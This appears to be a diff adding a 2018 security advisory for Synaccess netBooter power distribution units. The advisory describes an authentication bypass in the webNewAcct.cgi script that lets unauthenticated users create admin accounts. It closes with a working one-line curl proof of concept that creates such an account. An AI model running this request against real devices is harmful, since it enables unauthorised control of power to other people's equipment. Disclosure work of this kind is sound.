@@ -1,0 +1,49 @@
+Synaccess netBooter NP-02x/NP-08x 6.8 Authentication Bypass
+
+
+Vendor: Synaccess Networks Inc.
+Product web page: https://www.synaccess-net.com
+Affected version: NP-0201D (ver 6.8C)
+                  NP-02    (ver 6.5C)
+                  NP-02    (ver 6.4BC)
+                  NP-0801D (ver 6.4A)
+                  NP-08    (ver 6.10)
+                  NP-02    (ver 5.53BC)
+
+Summary: netBooter NP-02B and NP-02BH provide independent
+control of one or two outlets in a small, robust form factor.
+Manageable via TCP/IP network or direct serial connection
+and 1U brackets (optional) for mounting. Control power to
+your devices with the ability to fit just about anywhere.
+
+netBooter NP-0801DU and NP-0801DUH PDUs provide secured
+remote power source management of 8 independent outlets.
+Includes true RMS AC current reading and environment
+temperature monitoring* via TCP/IP networks or local direct
+connection.
+
+Desc: netBooter suffers from an authentication bypass
+vulnerability due to missing control check when calling
+webNewAcct.cgi script while creating users. This allows an
+unauthenticated attacker to create admin user account and
+bypass authentication giving her the power to turn off a
+power supply to a resource.
+
+Tested on: Synaccess server
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5500
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5500.php
+
+
+05.11.2018
+
+--
+
+PoC:
+
+curl -i http://10.0.0.17/webNewAcct.cgi --data "A1=hackerplusplus&A2=1234&A2=1234"
